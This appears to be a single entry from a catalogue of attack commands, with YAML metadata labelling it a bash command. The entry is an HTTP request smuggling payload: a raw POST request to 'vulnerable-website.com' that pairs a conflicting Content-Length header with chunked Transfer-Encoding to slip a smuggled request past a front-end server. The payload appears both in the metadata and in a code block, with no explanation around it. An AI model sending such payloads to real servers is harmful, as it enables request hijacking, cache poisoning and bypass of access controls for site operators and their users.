---
id: 5e080e93-eda6-47dd-9b12-0780a0d2e4ff
name: HTTP Request Smuggling
type: command
executor: bash
data: 'POST / HTTP/1.1

  Host: vulnerable-website.com

  Content-Length: 3

  Transfer-Encoding: chunked


  8

  SMUGGLED

  0'
output: null
created_at: '2023-04-06T03:56:31.993711+00:00'
updated_at: '2023-04-10T20:23:25.437078+00:00'
---

# HTTP Request Smuggling

```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```


